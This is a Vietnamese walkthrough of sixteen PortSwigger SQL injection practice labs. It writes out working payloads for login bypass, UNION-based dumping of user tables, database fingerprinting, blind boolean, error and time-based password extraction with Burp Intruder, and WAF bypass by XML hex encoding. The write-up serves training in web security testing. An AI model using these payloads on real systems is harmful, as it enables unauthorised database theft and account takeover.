# Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
![](https://imgur.com/00EXGcO.png)
- Lab này yêu cầu tấn công để web hiển thị tất cả các sản phẩm đã phát hành và chưa phát hành. Lỗ hổng này nằm trong filter category. 
- Dùng Burp Suite để bắt request từ category
![](https://imgur.com/7e8Ljm0.png)
- Đưa nó vào Repeater để sửa request, ta sẽ thực hiện SQL injection bằng cách thêm vào `'+OR+1=1--` 
    - Dấu ' để tìm kiếm lỗi
    - Thêm `+OR+1=1--` để câu lệnh luôn đúng, tức là hiển thị tất cả các sản phẩm trong category, bao gồm cả các categories không biết
    - `--` là cú pháp comment trong sql, tất cả những phần sau nó đều vô nghĩa, tức là `AND released = 1` sẽ được bỏ qua
    - Tóm lại, câu lệnh trở thành 
    ```sql
    SELECT * FROM products WHERE category = 'Tech+gifts'or'1'='1'-- AND released = 1
    ```
    
    ![](https://imgur.com/YWnXDTL.png)

Done!
![](https://imgur.com/VywUdqz.png)

# Lab 2: SQL injection vulnerability allowing login bypass
![](https://hackmd.io/_uploads/Hy_38WCb6.png)

Lab chứa lỗ hổng ở trang đăng nhập
![](https://hackmd.io/_uploads/rkOIuZAb6.png)
Nhập thử `a` ở `username` và `password` câu lệnh sql sẽ có dạng
```sql
SELECT * FROM users WHERE username = 'a' AND password = 'a'
```
Nếu nhập `username` là `'or'1'='1'--` thì lệnh này sẽ trở thành
```sql
SELECT * FROM users WHERE username = ''or'1'='1'-- AND password = 'a'
```
Vì 1=1 là điều kiện luôn đúng và password bị trở thành comment nên ta có thể login ở bất kỳ tài khoản nào
![](https://hackmd.io/_uploads/ryu4tbCZp.png)

Done!
![](https://hackmd.io/_uploads/ByMIF-0-p.png)

# Lab 3: SQL injection UNION attack, determining the number of columns returned by the query
![](https://hackmd.io/_uploads/SJO0kf0-a.png)

Lab này yêu cầu xác định số cột của câu lệnh sql sử dụng UNION
![](https://hackmd.io/_uploads/SycTkGAWp.png)
Giả sử câu lệnh sql là
```sql
SELECT name, price FROM product WHERE category = 'Gifts'
```
Lệnh trên truy vấn 2 cột `name` và `price` nên ta sẽ chèn thêm `'UNION SELECT NULL, NULL --`
Câu lệnh trở thành
```sql
SELECT name, price FROM product WHERE category = 'Gifts' UNION SELECT NULL, NULL --
```

Đưa tab filter category vào Repeater trong BurpSuite để thay đổi tham số category
UNION trả về đúng chỉ khi các truy vấn riêng lẻ có cùng số cột
Select 1 cột
![](https://hackmd.io/_uploads/SJdXxGCbT.png)

Select 2 cột
![](https://hackmd.io/_uploads/H1HBeGA-a.png)

Select 3 cột
![](https://hackmd.io/_uploads/Bk5UlG0Zp.png)
Như vậy câu lệnh sql ở đây select 3 cột

# Lab 4: SQL injection UNION attack, finding a column containing text
![](https://hackmd.io/_uploads/S1-CSfAW6.png)
Lab yêu cầu tìm cột có giá trị là string

![](https://hackmd.io/_uploads/HJUpwG0WT.png)
Đầu tiên, xác định số cột của câu lệnh sql
![](https://hackmd.io/_uploads/rkqI_f0W6.png)
Câu lệnh này chứa 3 cột

Tiếp theo, xác định cột nào là string
Tìm thấy ở cột thứ 2
![](https://hackmd.io/_uploads/Bknsuz0-a.png)

Thay chuỗi của đề yêu cầu
![](https://hackmd.io/_uploads/BJHmtGAWa.png)
Done!

# Lab 5: SQL injection UNION attack, retrieving data from other tables
![](https://hackmd.io/_uploads/SyTeJQ0bT.png)
Lab cho biết trong database chứa bảng `users` có 2 cột là `username` và `password`

Dùng UNION để tấn công: chèn thêm lệnh `'+UNION+SELECT+username,password+FROM+users--`

Ta tìm thấy tài khoản admin
![](https://hackmd.io/_uploads/B1rulQCZa.png)

Giờ thì login vào thui
![](https://hackmd.io/_uploads/B1qhlXCbT.png)
Done!

# Lab 6: SQL injection UNION attack, retrieving multiple values in a single column
![](https://hackmd.io/_uploads/B11vX7AW6.png)
Lab yêu cầu đưa ra tất cả giá trị trong bảng `users`

Đầu tiên, xác định số cột truy vấn 
![](https://hackmd.io/_uploads/Hyx3rmAWa.png)

Bước 2, xác định cột nào là định dạng string
![](https://hackmd.io/_uploads/Sy8yUQR-6.png)

Bước 3, ghép 2 giá trị `username` và `password` vào cột thứ 2 bằng cách chèn thêm `||'~'||`
Câu lệnh lúc này là
`'UNION+SELECT+NULL,username||'~'||password+FROM+users--`
![](https://hackmd.io/_uploads/HJxBQIXRZa.png)

Đem tài khoản và mật khẩu admin login vào
![](https://hackmd.io/_uploads/rJOK87AWp.png)
Done!

# Lab 7: SQL injection attack, querying the database type and version on Oracle
![](https://hackmd.io/_uploads/H1TMgLsfp.png)
Lab yêu cầu tấn công UNION để xác định phiên bản database 

Ta có [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) sau
![](https://hackmd.io/_uploads/r1OAu4jz6.png)

Đầu tiên, xác định số cột select, vì là `Oracle` nên phải `FROM` từ một bảng xác định, bảng này được gọi là `dual`
![](https://hackmd.io/_uploads/B1e9Ewofp.png)

Xác định cột nào là định dạng string
![](https://hackmd.io/_uploads/Skr4HwofT.png)

Payload câu lệnh tương ứng với `Oracle`
```sql
'+UNION+SELECT+banner,+NULL+FROM+v$version--
```
![](https://hackmd.io/_uploads/B1ryLvszT.png)
Done!

# Lab 8: SQL injection attack, querying the database type and version on MySQL and Microsoft
![](https://hackmd.io/_uploads/SkqBDVszT.png)
Lab yêu cầu tấn công UNION để xác định phiên bản database MySQl và Microsoft
Ta có [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) sau
![](https://hackmd.io/_uploads/r1OAu4jz6.png)

Đầu tiên, xác định xem câu lệnh hiện tại select bao nhiêu cột
![](https://hackmd.io/_uploads/BJ1dh4izp.png)

Tiếp theo, kiểm tra cột nào có giá trị là string
![](https://hackmd.io/_uploads/H1bd0EjzT.png)

Dùng câu lệnh `'UNION+SELECT+@@version,+NULL#`
![](https://hackmd.io/_uploads/B1JpJBoza.png)
Done!

# Lab 9: SQL injection attack, listing the database contents on non-Oracle databases
![](https://hackmd.io/_uploads/BJSO-rsG6.png)
Lab yêu cầu đưa ra nội dung bên trong database không phải Oracle

Xác định số cột select
![](https://hackmd.io/_uploads/HkqIXrjzp.png)

Xác định định dạng của cột nào là string
![](https://hackmd.io/_uploads/rkp9mBofp.png)

Ta có câu lệnh lấy ra các bảng từ database
```sql
SELECT table_name FROM information_schema.tables
```
Payload câu lệnh
```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```
![](https://hackmd.io/_uploads/HyXWBSoza.png)

Ta thu được rất nhiều bảng
![](https://hackmd.io/_uploads/rypMYSifp.png)

Ta có câu lệnh lấy ra tên cột từ bảng
```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'Users'
```
Payload với bảng `users_ssechg`
```sql
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_ssechg'--
```
![](https://hackmd.io/_uploads/r1oQproMT.png)

Tìm được 2 cột `username_rrdhji` và `password_nazjad`
![](https://hackmd.io/_uploads/rJ7upSjGa.png)

Select 2 cột này
![](https://hackmd.io/_uploads/rkoU0BsM6.png)
Tìm thấy tài khoản admin lab yêu cầu

Login vào thui
![](https://hackmd.io/_uploads/HyFaRBifa.png)
Done!

# Lab 10: SQL injection attack, listing the database contents on Oracle
![](https://hackmd.io/_uploads/r1ZWuDsfa.png)
Tương tự lab trên, nhưng database là `Oracle`

Xác định số cột select
![](https://hackmd.io/_uploads/rkDVAwizT.png)

Xác định cột nào có định dạng là string
![](https://hackmd.io/_uploads/BkX_CvjGp.png)

Payload câu lệnh lấy ra các bảng từ database
![](https://hackmd.io/_uploads/BJQtyOjMp.png)
![](https://hackmd.io/_uploads/By-OJ_ofT.png)

Payload câu lệnh lấy ra các cột từ bảng `USERS_ATZKZV`
![](https://hackmd.io/_uploads/B1Seldoz6.png)

Trong bảng `USERS_ATZKZV` tìm được 2 cột `USERNAME_CZPOAL` và `PASSWORD_KDHTWY`
![](https://hackmd.io/_uploads/rkkoeOsfp.png)

SELECT để xem nội dung của 2 cột này
![](https://hackmd.io/_uploads/r1OuWdoMT.png)
Tìm thấy tài khoản admin

Login thui
![](https://hackmd.io/_uploads/H1oDb_sf6.png)
Done!

# Lab 11: Blind SQL injection with conditional responses
![](https://hackmd.io/_uploads/By16ccoMa.png)
- Lab này chứa lỗ hổng blind SQL injection. Ứng dụng sử dụng cookie theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi.
- Kết quả của truy vấn SQL không được trả về và không có thông báo lỗi nào được hiển thị. Tuy nhiên, ứng dụng sẽ bao gồm thông báo *"Welcome back"* nếu truy vấn trả về bất kỳ hàng nào.
- Database của lab chứa bảng `users` với 2 cột `username` và `password`. Để giải lab ta cần phải tìm ra tài khoản `administrator` và login bằng nó.

Đầu tiên, ta chèn vào câu lệnh luôn đúng và luôn sai để xem response của web
![](https://hackmd.io/_uploads/SJzpzisz6.png)
![](https://hackmd.io/_uploads/S1Vazijzp.png)
Web sẽ trả về *"Welcome back"* nếu câu truy vấn đúng, và không trả về gì nếu truy vấn sai

Tận dụng lỗi này để khai thác `password` của tài khoản `administrator`

Kiểm tra xem bảng `users` có tồn tại hay không bằng payload
```sql
'+AND+(SELECT+'a'+FROM+users+LIMIT+1)='a'--
```
![](https://hackmd.io/_uploads/Skv1NojM6.png)
Trả về *"Welcome back"* nên tồn tại bảng `users`

Kiểm tra xem có `username` nào là `administrator` hay không bằng payload
```sql
'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator')='a'--
```
![](https://hackmd.io/_uploads/BJ-UNijGa.png)
Trả về *"Welcome back"* nên tồn tại `username` là `administrator`

Tiếp theo, kiểm tra độ dài của `password` là bao nhiêu bằng payload
```sql
'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>1)='a'--
```
![](https://hackmd.io/_uploads/rJy_Vcnz6.png)
Trả về *"Welcome back"* tức là password có độ dài lớn hơn 1

Ta sẽ brute force bằng Burp Intruder với attack type *Sniper* và payload với đối số là 1
![](https://hackmd.io/_uploads/Hy1hBqnMT.png)
![](https://hackmd.io/_uploads/B1Lr5q2Mp.png)
![](https://hackmd.io/_uploads/rklvtq3zT.png)
![](https://hackmd.io/_uploads/H13J3qnfT.png)
Như vậy, password có độ dài 20 kí tự

Tiếp theo, brute force từng kí tự trong password
Payload
```sql
'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='a'--
```
Gửi qua Intruder
- Gán 2 biến: biến thứ nhất là vị trí trong xâu, từ 1 -> 20; biến thứ hai là kí tự kiểm tra, a -> z, 0 -> 9
- Attack type là *Cluster bomb*
![](https://hackmd.io/_uploads/HJAPTo3f6.png)
- Gán miền giá trị cho từng biến
![](https://hackmd.io/_uploads/Skcolsnfa.png)
![](https://hackmd.io/_uploads/r1nAgjnfT.png)
- Nếu trả về *"Welcome back"* thì chính là kí tự đúng
![](https://hackmd.io/_uploads/H1ce-s2Ga.png)

*Chú ý: dùng bản pro nhanh hơn :))))))*
![](https://hackmd.io/_uploads/B1RmDR6fa.png)

- Sắp xếp lại vị trí, ta được mật khẩu: `vzpttufherdpsiqgirg3`

Login xem nào
![](https://hackmd.io/_uploads/H1ZG_ATfp.png)
Done!

# Lab 12: Blind SQL injection with conditional errors
![](https://hackmd.io/_uploads/HJ3nU1RMp.png)
- Lab này sẽ không trả về giá trị nào của truy vấn, còn nếu sql lỗi thì ứng dụng sẽ đưa ra lỗi tương ứng
- Database chứa bảng `users` có 2 cột `username` và `password`. Ta phải khai thác lỗ hổng blind SQL injection để tìm ra tài khoản `administrator`.

Đầu tiên, xác định xem web sử dụng database loại gì
![](https://hackmd.io/_uploads/H1TtyxRza.png)
Web không xảy ra lỗi, tức là nó sử dụng Oracle

Ta có truy vấn sẽ làm cho câu lệnh lỗi
```sql
SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ''
```
Tận dụng lỗi này để khai thác

Tiếp theo, xác định có tồn tại `username` là `administator` không
```sql
'+||(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username='administrator')||'
```
![](https://hackmd.io/_uploads/H1vqzg0M6.png)
Nhận được lỗi, chứng tỏ tồn tại

Tiếp theo, tìm độ dài của password
```sql
'+||(SELECT+CASE+WHEN+LENGTH(password)>§1§+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username='administrator')||'
```
![](https://hackmd.io/_uploads/ByOH7lRzp.png)
Thử từ 1 -> 30 
![](https://hackmd.io/_uploads/ByqR7lCfp.png)
Có sự thay đổi ở vị trí 20 trở đi
![](https://hackmd.io/_uploads/S1KyExAMa.png)
Ở đây web không xảy ra lỗi (status 200), chứng tỏ password có 20 kí tự

Tiếp theo, tìm từng kí tự của password
```sql
'+||(SELECT+CASE+WHEN+SUBSTR(password,$1$,1)='§a§'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username='administrator')||'
```
Tại vị trí nào web xảy ra lỗi (status 500) thì ở đó chính là vị trí kí tự của password
![](https://hackmd.io/_uploads/B12f8x0GT.png)

Sắp xếp lại ta được: `y4dylv102y07vu4kf50l`

![](https://hackmd.io/_uploads/BkUF8lRGT.png)
Done!

# Lab 13: Visible error-based SQL injection
![](https://hackmd.io/_uploads/B1-8ejRf6.png)
- Ứng dụng sử dụng cookie theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi. Kết quả của truy vấn SQL không được trả về.
- Mục tiêu lab: tìm cách rò rỉ mật khẩu cho người dùng quản trị viên, sau đó đăng nhập vào tài khoản của họ.

Đầu tiên, thử truy vấn luôn đúng và luôn sai
![](https://hackmd.io/_uploads/rkh4XiAzT.png)
![](https://hackmd.io/_uploads/SJoSXsRG6.png)
Web không lỗi, chứng tỏ điều này không có tác dụng trong bài lab này

Payload câu lệnh để ép kiểu string về int
![](https://hackmd.io/_uploads/Bkj_ViCfT.png)
Web trả về lỗi

Thay đổi một chút thì câu lệnh này thành hợp lệ, vì điều kiện AND phải là kiểu boolean (đúng hoặc sai)
![](https://hackmd.io/_uploads/ryMcBs0z6.png)

Áp dụng vào bài lab
![](https://hackmd.io/_uploads/ByNYIjRMT.png)
Tiếp tục nhận được lỗi, truy vấn bị giới hạn kí tự

Do đó ta sẽ xóa bớt giá trị cookie để nhường chỗ cho chúng
![](https://hackmd.io/_uploads/Bya4wjAfa.png)

Có nhiều hơn 1 dòng được trả về, nên ta phải giới hạn nó
![](https://hackmd.io/_uploads/rJXFDiCMp.png)
Ở đây, ta thấy web bị rò rỉ `username` là `adsministrator`, và cũng là `username` đầu tiên trong bảng

Thay đổi payload để leak được mật khẩu
![](https://hackmd.io/_uploads/HJNruj0GT.png)

Login vào xem sao
![](https://hackmd.io/_uploads/HkX_uj0Ga.png)
Done!

# Lab 14: Blind SQL injection with time delays
![](https://hackmd.io/_uploads/BJC7soCGp.png)
- Kết quả của truy vấn SQL không được trả về và ứng dụng không phản hồi hay gây ra lỗi.
- Tuy nhiên, do truy vấn được thực hiện đồng bộ nên có thể kích hoạt độ trễ thời gian có điều kiện để suy ra thông tin.
- Để giải lab này, chỉ cần làm web response chậm 10s

Ta có [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
![](https://hackmd.io/_uploads/BJ0D3jAM6.png)

Vì ta chưa biết web sử dụng DB loại gì, nên sẽ thử từng cái. Sau khi thêm đến `'+||+pg_sleep(10)--` thì thành công
![](https://hackmd.io/_uploads/rkVw0sAG6.png)

# Lab 15: Blind SQL injection with time delays and information retrieval
![](https://hackmd.io/_uploads/H1YL5iRza.png)
Tương tự lab trên

Đầu tiên, kiểm tra xem web sử dụng DB loại nào
![](https://hackmd.io/_uploads/ryB5i4kQT.png)
Thử lệnh `|| pg_sleep(10)` thì thấy web phản hổi khá lâu còn các lệnh khác thì rất nhanh, chứng tỏ web sử dụng `PostgreSQL`

Tiếp theo, payload lệnh
```sql
'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
```
Khi username là `administrator` có độ dài password > 1 thì web sẽ phản hổi sau 10s, ngược lại web phản hồi ngay

Gửi qua Intruder, thử 1 -> 30
![](https://hackmd.io/_uploads/SJvvCV17T.png)
![](https://hackmd.io/_uploads/BkDx1rJXp.png)
![](https://hackmd.io/_uploads/HJHxxrJXa.png)
![](https://hackmd.io/_uploads/S1LZlHJ7a.png)

Ở request 20 ta thấy thời gian phản hồi giảm hẳn => password có độ dài 20 kí tự
![](https://hackmd.io/_uploads/HJWQxr17a.png)

Tiếp theo, payload lệnh để kiểm tra từng kí tự của password
```sql
'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
```
Attack type: Cluster bomb
![](https://hackmd.io/_uploads/H1Rgbr1mp.png)
![](https://hackmd.io/_uploads/ryZ8bB1Xa.png)
![](https://hackmd.io/_uploads/BJZv-SJmp.png)
![](https://hackmd.io/_uploads/BkX4-r1QT.png)

Ta thấy những phản hổi lớn hơn 10s thì chính là kí tự chính xác
![](https://hackmd.io/_uploads/Hkr2Nr1mp.png)

Sắp xếp lại được: `3spdqwcns2hyu9lxsyb8`

![](https://hackmd.io/_uploads/r1eV2BBJQa.png)
Done!

# Lab 16: SQL injection with filter bypass via XML encoding
![image.png](https://hackmd.io/_uploads/rkFqI0k7a.png)
- Lab này chứa lỗ hổng SQL. Kết quả từ truy vấn được trả về trong phản hồi của ứng dụng, do đó có thể sử dụng tấn công UNION để truy xuất dữ liệu từ các bảng khác.
- Mục tiêu lab: tấn công SQL để lấy tài khoản của `adminnistrator`, sau đó login.

Đầu tiên, ta sẽ tìm kiếm các đầu vào có liên quan đến stock
![image.png](https://hackmd.io/_uploads/SJCU3RJXa.png)

Gửi qua Repeater để xử lý. 
- Ở đây, ta thấy code XML chứa `productID` và `storeID` sẽ gửi truy vấn đến web, và web sẽ trả vể số lượng hàng còn lại của sản phẩm này.
- Tuy nhiên, nếu tham số này không được mã hóa, ta có thể tận dụng để truy xuất nội dung từ DB

Tiếp theo, xác định số cột của truy vấn
![image.png](https://hackmd.io/_uploads/Hk7sR0JQp.png)
Yêu cầu của chúng ta bị chặn bởi tưởng lừa

Để vượt qua tường lửa này, ta sử dụng extension `Hackvertor`. Tool này dùng để mã hóa dữ liệu dưới các dạng: rot13, base64, hex, url encode, md5, sha1,...

Ở đây ta sẽ encode truy vấn sử dụng `hex_entities`
![image.png](https://hackmd.io/_uploads/S15Zg1emp.png)

Tiếp tục kiểm tra số cột thui
![image.png](https://hackmd.io/_uploads/SJzjxyxma.png)
Trả vể 0 sản phẩm, vậy không phải 2 cột
![image.png](https://hackmd.io/_uploads/H1cilyxX6.png)
Trả vể số lượng sản phẩm, như vậy truy vấn có 1 cột

Ta cần lấy ra `username` và `password`, mà lại chỉ có 1 cột, nên phải nối giá trị của chúng với nhau
Payload
```sql
UNION SELECT username || '~' || password FROM users
```
![image.png](https://hackmd.io/_uploads/HkZO-1lm6.png)

Thấy các tài khoản được trả về, login với `administrator` 
![image.png](https://hackmd.io/_uploads/BkUkG1xXa.png)
Done!







